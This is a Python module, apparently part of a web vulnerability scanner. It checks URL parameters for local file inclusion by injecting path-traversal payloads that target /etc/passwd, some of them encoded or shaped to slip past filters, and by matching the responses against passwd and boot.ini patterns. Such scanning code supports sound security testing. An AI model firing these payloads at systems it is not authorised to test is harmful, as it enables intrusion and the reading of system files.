import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils.colors import console

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd",
    "....//....//....//....//etc/passwd",
]

LFI_PATTERNS = [
    r"root:.*:0:0:",
    r"daemon:.*:1:1:",
    r"\[boot loader\]",
    r"\[extensions\]",
]

def check_lfi(requester, url):
    result = {"name": "LFI", "findings": [], "vulnerable": []}
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        console.print("[dim]    i No parameters found, skipping[/dim]")
        return result
    console.print(f"[info]  -> Testing {len(params)} param(s) with {len(LFI_PAYLOADS)} payloads...[/info]")
    for param in params:
        console.print(f"[dim]    -> Param: {param}[/dim]")
        for i, payload in enumerate(LFI_PAYLOADS, 1):
            q = params.copy()
            q[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))
            console.print(f"[dim]      [{i}/{len(LFI_PAYLOADS)}] {payload}[/dim]")
            resp = requester.get(test_url)
            if resp:
                for pat in LFI_PATTERNS:
                    if re.search(pat, resp.text):
                        console.print(f"[vuln]    !! LFI via {param}![/vuln]")
                        result["vulnerable"].append({"param": param, "payload": payload})
                        result["findings"].append({
                            "severity": "high",
                            "msg": f"LFI via param: {param} (payload: {payload})",
                        })
                        return result
    if not result["vulnerable"]:
        console.print("[success]    + No LFI found[/success]")
    return result
